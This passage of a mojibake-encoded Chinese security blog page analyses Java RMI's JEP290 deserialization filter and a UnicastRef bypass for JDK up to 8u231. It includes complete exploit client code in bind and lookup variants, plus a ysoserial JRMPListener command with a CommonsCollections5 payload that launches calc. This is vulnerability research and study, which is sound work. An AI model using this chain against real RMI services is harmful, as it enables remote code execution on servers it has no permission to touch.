ç­”æ¡ˆæ˜¯åœ¨è°ƒç”¨getRegistryæ—¶UnicastServerRefä¾¿è¢«åˆå§‹åŒ–äº†ï¼Œå…¶filterå€¼ä¹Ÿè¢«è¿›è¡Œäº†èµ‹å€¼(Naming.bind ä¼šè‡ªåŠ¨è°ƒç”¨ LocateRegistry.getRegistry)ã€‚
å¦‚ä¸‹å›¾ä¾¿æ˜¯è·Ÿè¿›LocateRegistry.getRegistryæ–¹æ³•åçš„ä»£ç ï¼Œæ­¤å¤„å®ä¾‹åŒ–äº†ä¸€ä¸ªUnicastServerRefå¯¹è±¡ã€‚</p>
</blockquote>
<p><img alt="" src="../image/image_MI9u5cPp8-.png" /></p>
<p><img alt="" src="../image/image_dr60ObgUcs.png" /></p>
<blockquote>
<p>æ‰€ä»¥UnicastServerRef.this.filterçš„å€¼ä¾¿æ˜¯RegistryImpl#registryFilter</p>
</blockquote>
<p>åœ¨è°ƒç”¨unmarshalCustomCallDataè®¾ç½®å¥½å½“å‰åºåˆ—åŒ–æµçš„è¿‡æ»¤å™¨åï¼Œç¨‹åºå†å¼€å§‹è°ƒç”¨RegistryImpl_Skel#dispatchæ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p>
<p><img alt="" src="../image/image_0IIugJ7ir_.png" /></p>
<p>åœ¨readObjectæ–¹æ³•ä¸­ä¼šåˆ¤æ–­å½“å‰åºåˆ—åŒ–æµæ˜¯å¦é…ç½®æœ‰è¿‡æ»¤å™¨ï¼Œå¦‚æœæœ‰è¿‡æ»¤å™¨å°±åœ¨ä¸‹é¢ç”¨checkInputå¯¹åºåˆ—åŒ–æµè¿›è¡Œè¿‡æ»¤ã€‚è€ŒcheckInputå®è´¨æ˜¯æ˜¯è°ƒç”¨åºåˆ—åŒ–æµçš„è¿‡æ»¤å™¨æ¥è¿›è¡Œè¿‡æ»¤</p>
<p><img alt="" src="../image/image_DRIU9OzYne.png" /></p>
<p>ä¸‹å›¾æ˜¯ä»ååºåˆ—åŒ–åˆ°è¿‡æ»¤çš„æ ˆå¸§ã€‚</p>
<p><img alt="" src="../image/image_HQCP7-fVSl.png" /></p>
<h2 id="jep290-bypass">JEP290 BYPASS</h2>
<h3 id="unicastrefjdk8u231">UnicastRefï¼ˆJDK&lt;=8u231ï¼‰</h3>
<p>RegistryImpl_stubè¿‡æ»¤ä¸­çš„ç™½åå•ç±»ä¸­æœ‰UnicastRef ç±»ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªç±»ä¸Šä¸‹æ–‡ç« ç»•è¿‡JEP290.</p>
<blockquote>
<p>è¿™é‡Œå…ˆæ¥æŠŠè¯¥æ”»å‡»æ–¹æ³•çš„å¤§è‡´è½®å»“å‹¾å‹’å‡ºæ¥ï¼Œæ–¹ä¾¿é˜…è¯»ä¸‹é¢çš„å†…å®¹ï¼š
é¦–å…ˆæˆ‘ä»¬å‘æ³¨å†Œç«¯å‘é€ä¸€ä¸ªæ¶æ„å¯¹è±¡
è¯¥å¯¹è±¡èƒ½åœ¨è¢«ååºåˆ—åŒ–æ—¶ä¸»åŠ¨å‘ä¸€ä¸ªæ¶æ„æ³¨å†Œç«¯å‘èµ·é€šè®¯å¹¶ååºåˆ—åŒ–å…¶ä¼ é€è¿‡æ¥çš„å†…å®¹ï¼Œæ­¤è¿‡ç¨‹çš„ååºåˆ—åŒ–æ²¡æœ‰ç»è¿‡Filteræ£€éªŒ
å®Œæˆæ”»å‡»</p>
</blockquote>
<p>æˆ‘æ‰€è¿›è¡Œè°ƒè¯•çš„ä»£ç å¦‚ä¸‹</p>
<pre><code class="language-java">import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class server {
    public static void main(String[] args) throws Exception{
        String url = &quot;rmi://127.0.0.1:1069/user&quot;;
        user user = new userImpl();
        LocateRegistry.createRegistry(1069);
        Naming.bind(url,user);
        System.out.println(&quot;Server Running Atï¼š&quot; + url);
        System.out.println(1);
    }
}
</code></pre>
<p>å®¢æˆ·ç«¯çš„expå¦‚ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿç€expä¸­çš„å†…å®¹æŠ½ä¸å‰¥èŒ§çš„åˆ†æ</p>
<pre><code class="language-java">ublic class client {
    public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {

        Registry reg = LocateRegistry.getRegistry(&quot;localhost&quot;,1069);
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(&quot;127.0.0.1&quot;, 8888);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        reg.bind(&quot;test12&quot;,proxy);

    }

}
</code></pre>
<h4 id="liveref">LiveRef</h4>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹LiveRefï¼Œè¿™å¯¹è±¡æ˜¯RMIé€šè®¯ä¸­æ¯”è¾ƒæ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œå®ƒè®°å½•äº†æ³¨å†Œç«¯çš„å„ç§ä¿¡æ¯ã€‚æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹å†…å®¹æ¥çœ‹LiveRefæ˜¯å¦‚ä½•å®šä½æ³¨å†Œç«¯çš„ï¼Œä¸ºæˆ‘ä»¬æ’°å†™EXPæ—¶é€šè¿‡LiveRefå®šä½æ¶æ„æ³¨å†Œç«¯åšé“ºå«ã€‚</p>
<p>åœ¨Naming.lookup æˆ–è€… Naming.bindæ–¹æ³•ä¸­ï¼Œéƒ½ä¼šå…ˆé€šè¿‡getRegistryæ–¹æ³•è·å–æ³¨å†Œç«¯ã€‚</p>
<p><img alt="" src="../image/image_ojU7oGHoPl.png" /></p>
<p><img alt="" src="../image/image_fhjlQp5e_7.png" /></p>
<p>è€ŒgetRegistryè¿”å›çš„å¯¹è±¡æ˜¯ä¸€ä¸ªå°è£…äº†çš„UnicastRefå¯¹è±¡ï¼ŒUnicastRefä¸­å°è£…äº†LiveRefå¯¹è±¡ï¼Œå­˜å‚¨äº†æ³¨å†Œç«¯ä¿¡æ¯ã€‚
æ‰€ä»¥å®é™…ä¸Šæ³¨å†Œç«¯ä¿¡æ¯æ˜¯ç”±å°è£…åœ¨UnicastRefå¯¹è±¡ä¸­çš„LiveRefå¯¹è±¡æ¥å­˜å‚¨çš„ã€‚</p>
<p><img alt="" src="../image/image_ZO97iVRP4k.png" /></p>
<p>åœ¨bindæ–¹æ³•æ‰§è¡Œæ—¶ï¼Œä¼šå…ˆé€šè¿‡UnicastRef.newcallåˆ©ç”¨LiveRefå­˜å‚¨çš„æ³¨å†Œç«¯ä¿¡æ¯å»å®šä½æ³¨å†Œç«¯</p>
<p><img alt="" src="../image/image_CvEj6AUxGg.png" /></p>
<p>é‚£ä¹ˆLiveRefä¸­å­˜å‚¨çš„ä¿¡æ¯ï¼ˆep,id,islocal)æ˜¯ä»å“ªæ¥çš„å‘¢ï¼Ÿæˆ‘ä»¬å°±éœ€è¦å»çœ‹çœ‹UnicastRefæ˜¯å¦‚ä½•åˆå§‹åŒ–LiveRefè¿™ä¸ªç±»çš„ã€‚</p>
<p>äºUnicastRef#UnicastRef(LiveRef var1)ä¸æœåŠ¡ç«¯bindå¤„ä¸‹æ–­ç‚¹ï¼Œå½“æ–­ç‚¹åœ¨bindå¤„åœä¸‹æ—¶ä½¿å…¶ç»§ç»­è¿è¡Œåˆ°UnicastRef#UnicastRef(LiveRef var1ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¦‚ä¸‹æ ˆå¸§</p>
<p><img alt="" src="../image/image_1Fnc8uY0CD.png" /></p>
<p>åœ¨LocateRegistry#getRegistry å¤„ä¼šå®ä¾‹åŒ–LiveRefå¹¶ä¼ å…¥å‚æ•°ï¼Œç„¶åç”¨æ­¤LiveRefå¯¹è±¡å®ä¾‹åŒ–UnicastRefã€‚</p>
<p>æˆ‘ä»¬çœ‹çœ‹å®ä¾‹åŒ–LiveRefæ—¶ä¼ å…¥çš„å‰ä¸¤ä¸ªå‚æ•°ã€‚</p>
<p>å…ˆæ¥çœ‹objidï¼Œè¿™é‡Œçš„ObjIDã€‚REGISTRY_IDæ˜¯ä¸€ä¸ªå›ºå®šå€¼0</p>
<p><img alt="" src="../image/image_LpgL1WLIVo.png" /></p>
<p>å†æ¥çœ‹çœ‹TCPEndpointï¼Œä¼ å…¥TCPEndpointçš„å‚æ•°åˆ†åˆ«æ˜¯ä»rmiåœ°å€å­—ç¬¦ä¸²ä¸­è¯»å–çš„hostï¼Œportä»¥åŠä¸¤ä¸ªnullå€¼ï¼ˆcsfå›ºå®šä¸ºnullï¼‰</p>
<p><img alt="" src="../image/image_6Qq1WAa96h.png" /></p>
<p><img alt="" src="../image/image_geiDF3C7l0.png" /></p>
<p>åˆ°è¿™é‡Œå°±æ˜ç™½äº†LiveRefæ˜¯å¦‚ä½•å®šä½æ³¨å†Œç«¯çš„äº†ã€‚</p>
<h4 id="remoteobjectinvocationhandler">RemoteObjectInvocationHandler&#x20;</h4>
<p>RemoteObjectInvocationHandler è¿™ä¸ªå¯¹è±¡æ˜¯Remoteçš„å­ç±»ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥é€šè¿‡RMIçš„è¿‡æ»¤æ£€æµ‹çš„ã€‚</p>
<p>expè¿è¡Œåï¼Œå½“æ³¨å†Œç«¯ååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨RemoteObjectInvocationHandlerçˆ¶ç±»RemoteObjectçš„readObjectæ–¹æ³•ï¼ˆå› ä¸ºRemoteObjectInvocationHandlerè‡ªèº«å¹¶æ— readObjectæ–¹æ³•ï¼‰ï¼Œåœ¨RemoteObjectçš„readObjectæ–¹æ³•æœ«è¡Œæœ‰ä¸€ä¸ªref.readExternal(in)</p>
<p><img alt="" src="../image/image_FQvnbioCOj.png" /></p>
<p>è·Ÿè¿›è¯¥æ–¹æ³•</p>
<p><img alt="" src="../image/image_sHkw71kWPO.png" /></p>
<p>è°ƒç”¨äº†LiveRefçš„é™æ€æ–¹æ³•readï¼Œè·Ÿè¿›è¯¥æ–¹æ³•</p>
<p><img alt="" src="../image/image_xmBaoIDE2t.png" /></p>
<p>å‘ç°è¿™ä¸ªæ–¹æ³•ä¼šæ ¹æ®åºåˆ—åŒ–æµä¸­çš„å†…å®¹è¿˜åŸå‡ºLiveRefå¯¹è±¡ï¼Œè¿˜åŸå‡ºçš„LiveRefå¯¹è±¡ä¸­è®°å½•äº†æ¶æ„æ³¨å†Œç«¯çš„IPå’Œç«¯å£å·ç­‰ä¿¡æ¯ã€‚</p>
<p>ç„¶åå†ç»è¿‡ä¸€ç³»åˆ—çš„æµç¨‹ï¼Œä¼šè°ƒç”¨åˆ°DGCClient#registerRefs</p>
<p><img alt="" src="../image/image_KTpiu0tGg4.png" /></p>
<p>56è¡Œä»¥LiveRefä¸­è®°å½•çš„æ¶æ„æ³¨å†Œç«¯åœ°å€ä¸ºå‚æ•°ï¼Œè°ƒç”¨äº†DGCClient.EndpointEntry.lookupï¼Œè¿”å›äº†ä¸€ä¸ªå°è£…äº†æ¶æ„æ³¨å†Œç«¯åœ°å€çš„DGCClientå¯¹è±¡ã€‚
ç„¶åè°ƒç”¨äº†è¯¥DGCClientå¯¹è±¡çš„registerRefsæ–¹æ³•ã€‚è·Ÿè¿›</p>
<p><img alt="" src="../image/image_b2YzUrp66H.png" /></p>
<p>å†DGCClient#registerRefs æœ«è¡Œä¼šè°ƒç”¨ä¸€ä¸ªmakeDirtyCallæ–¹æ³•ï¼Œå…¶ä¸­var2å°è£…äº†æŒ‡å‘æ¶æ„æ³¨å†Œç«¯çš„LiveRefå¯¹è±¡ï¼Œè·Ÿè¿›</p>
<p><img alt="" src="../image/image_zvUxKF5tbU.png" /></p>
<p>ç„¶åä¼šè°ƒç”¨ä¸€ä¸ªthis.dgc.dirtyæ–¹æ³•ï¼Œthis.dgcä¸­å°è£…äº†æŒ‡å‘æ¶æ„æ³¨å†Œç«¯çš„LiveRefï¼Œè·Ÿè¿›</p>
<p><img alt="" src="../image/image_Ju_oQPup9l.png" /></p>
<p>æ­¤å¤„çš„ä»£ç ï¼ˆDGCImpl_stub#dirtyï¼‰å°±å¾ˆåƒ&#x20;
è¯¥æ–¹æ³•ä¼šå…ˆå‘æ¶æ„æ³¨å†Œç«¯å»ºç«‹é€šè®¯ï¼Œå‘é€åºåˆ—åŒ–ä¿¡æ¯ï¼Œæ¥æ”¶æ³¨å†Œç«¯ä¼ æ¥çš„ä¿¡æ¯å¹¶è¿›è¡Œååºåˆ—åŒ–ã€‚åœ¨è¯¥readObjectè¿›è¡Œååºåˆ—åŒ–æ—¶å¹¶æ²¡æœ‰è®¾ç½®è¿‡æ»¤å™¨ï¼Œæ‰€ä»¥è‡ªç„¶è€Œç„¶åœ°ä¾¿ç»•è¿‡äº†RMIé€šè®¯ä¸­JEP290è®¾ç½®çš„è¿‡æ»¤å™¨çš„æ£€æµ‹ï¼Œä»è€Œå¯ä»¥ååºåˆ—åŒ–ä»»ä½•æ¶æ„æ³¨å†Œç«¯ä¼ æ¥çš„åºåˆ—åŒ–æµï¼Œé€ æˆååºåˆ—åŒ–æ”»å‡»ã€‚</p>
<h4 id="_9">å®Œæ•´å¤ç°</h4>
<p>é¦–å…ˆå¼€å¯æ³¨å†Œç«¯ï¼Œuserç±»çš„å…·ä½“ä»£ç å°±ä¸è´´äº†ï¼Œæ³¨å†Œç«¯ç«¯å£ä¸º1069</p>
<pre><code class="language-java">import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class server {
    public static void main(String[] args) throws Exception{
        String url = &quot;rmi://127.0.0.1:1069/user&quot;;
        user user = new userImpl();
        LocateRegistry.createRegistry(1069);
        Naming.bind(url,user);
        System.out.println(&quot;Server Running Atï¼š&quot; + url);
        System.out.println(1);
    }
}
</code></pre>
<p>å®¢æˆ·ç«¯ä»£ç </p>
<pre><code class="language-java">import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;


public class client {
    public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {

        Registry reg = LocateRegistry.getRegistry(&quot;localhost&quot;,1069);
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(&quot;127.0.0.1&quot;, 8888);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        reg.bind(&quot;test12&quot;,obj);

    }

}
</code></pre>
<p>ç„¶åysoserialå¯åŠ¨æ¶æ„æ³¨å†Œç«¯</p>
<pre><code class="language-java">java -cp .\ysoserial-master-d367e379d9-1.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 &quot;calc&quot;
</code></pre>
<p>å®¢æˆ·ç«¯è¿è¡Œï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p>
<p><img alt="" src="../image/image_dLsg6mkaq9.png" /></p>
<h4 id="lookup">ä»¿å†™lookupå®ç°</h4>
<p>é™¤äº†bindï¼Œä¹Ÿå¯ä»¥ç”¨lookupçš„ä»¿å†™æ¥å®ç°ï¼Œè¿™ä¸¤è€…ä¹‹é—´åº•å±‚åŸç†éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p>
<pre><code class="language-java">import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import java.lang.reflect.Proxy;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.util.Random;
import java.io.ObjectOutput;
import java.lang.reflect.Field;

public class client {
    public static void main(String[] args) throws Exception {

        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;,1069);
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(&quot;localhost&quot;, 8888);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, true));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);

        //æ¨¡ä»¿lookupè¯·æ±‚
        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
        fields_0[0].setAccessible(true);
        UnicastRef ref2 = (UnicastRef) fields_0[0].get(registry);
        Field[] fields_1 = registry.getClass().getDeclaredFields();
        fields_1[0].setAccessible(true);
        Operation[] operations = (Operation[]) fields_1[0].get(registry);
        RemoteCall var2 = ref2.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
        ObjectOutput var3 = var2.getOutputStream();
        var3.writeObject(obj);
        ref2.invoke(var2);
    }

}
</code></pre>
<h4 id="_10">æ€»ç»“</h4>
<p>æ‰€ä»¥æœ¬è´¨ä¸Šæ­¤ç»•è¿‡æ–¹æ³•æ˜¯<strong>é€šè¿‡ååºåˆ—åŒ–è®©æ³¨å†Œç«¯å˜ä¸ºJRMPå®¢æˆ·ç«¯ï¼Œå‘æˆ‘ä»¬æ¶æ„çš„JRMPæ³¨å†Œç«¯å‘èµ· JRMP è¯·æ±‚ã€‚</strong></p>
<p>å€Ÿç”¨ä¸€ä¸‹ttpfxå¸ˆå‚…çš„å›¾å¤ç›˜å…¨è¿‡ç¨‹</p>
<p><img alt="" src="../image/image_qGuS-uhiD2.png" /></p>
<p>UnicastRefä¸­çš„LiveRefè¢«ç”¨ä½œå®šä½æ³¨å†Œç«¯ï¼Œè¿™æ˜¯å‰æã€‚
RemoteObjectçš„readObjectæ–¹æ³•ä¼šåœ¨RMIååºåˆ—åŒ–è¿‡ç¨‹ä¸­è¢«è°ƒç”¨ï¼Œå…¶readObjectæ–¹æ³•ä¼šåœ¨åç»­ä¸­è¿˜åŸæ‰€å°è£…çš„LiveRefå¯¹è±¡ï¼Œå¹¶å‘LiveRefå¯¹è±¡æŒ‡å‘çš„æ³¨å†Œç«¯å‘èµ·é€šè®¯ï¼Œååºåˆ—åŒ–å…¶è¿”å›çš„æ•°æ®ï¼Œç”±äºè¯¥ååºåˆ—åŒ–æµæœªå¢æ·»è¿‡æ»¤å™¨ï¼Œæ‰€ä»¥ç»•è¿‡JEP290é€ æˆäº†ååºåˆ—åŒ–æ”»å‡»ã€‚</p>
<p>å› ä¸ºæ–‡ç« æ˜¯åœ¨è¾¹è°ƒè¯•è¾¹å†™çš„ï¼Œä¸­é€”è¿›è¡Œäº†å¤šæ¬¡åˆ æ”¹ï¼Œæ‰€ä»¥å¯¼è‡´äº›è®¸åœ°æ–¹è¨€è¾ä¸å¤Ÿå‡†ç¡®ï¼Œæœ›å„ä½è§è°…ã€‚</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../../Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../../Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/Gadget%E5%88%A9%E7%94%A8%E7%B1%BB%E6%80%BB%E7%BB%93/" class="btn btn-xs btn-link">
        Gadgetåˆ©ç”¨ç±»æ€»ç»“
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/JNDI%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" class="btn btn-xs btn-link">
        JNDIæ³¨å…¥åŸç†æµ…æ
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>